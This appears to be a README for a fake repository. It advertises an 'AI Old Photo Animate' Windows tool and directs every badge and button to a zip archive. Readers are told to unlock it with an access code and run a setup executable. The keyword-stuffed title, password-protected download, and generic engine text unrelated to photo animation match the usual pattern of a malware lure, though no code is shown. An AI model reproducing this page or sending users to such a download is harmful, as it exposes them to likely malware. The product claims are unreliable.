<div align="center">

# AI Old Photo Animate — AI Old Photo Animate — Ai Old Photo Animate (Hot-Reload Config, Zero Dependencies)

<p><strong>AI Old Photo Animate — AI Old Photo Animate — Ai Old Photo Animate (Hot-Reload Config, Zero Dependencies): AI Old Photo Animate — animate and animation in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/old-photo-life-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/old-photo-life-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/old-photo-life-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/old-photo-life?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/old-photo-life-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download old-photo-life-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/old-photo-life-v0.1.0-win64.zip"><img src="banner.svg" alt="AI Old Photo Animate Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**AI Old Photo Animate — AI Old Photo Animate — animate and animation in one tool** (`old-photo-life`) is a portable Windows 10/11 runtime suite: drop the prebuilt package, point it at `config/settings.json`, and go. No compiler, no external dependencies, live hot-reload included.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`old-photo-life-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/old-photo-life-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`old-photo-life-v0.1.0-win64.zip`](../../releases/download/v0.1.0/old-photo-life-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `OldPhotoLife_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## Documentation & Guides

- [Usage Guide — commands and options](docs/USAGE.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)

## Engine Components

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Primary Subsystem** | Bounded ring-buffer pipeline with zero-copy handoff | `live toggle` |
| **State Engine** | Atomic JSON state with crash-safe rollback | `keep_state` |
| **Config Watcher** | Hot-reloadable settings, applied without restart | `hot_reload` |
| **Telemetry** | Compact stderr channel, silent by default | `quiet / --verbose` |

## Building from Source

```bash
git clone https://github.com/TestOwner/old-photo-life.git
cd old-photo-life
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: old-photo-life, old-photos, animation, restore, colorize, photos, memories, ai, animate, cli, developer-tools, open-source, windows, automation, productivity, cpp, portable, prebuilt, tools</sub>
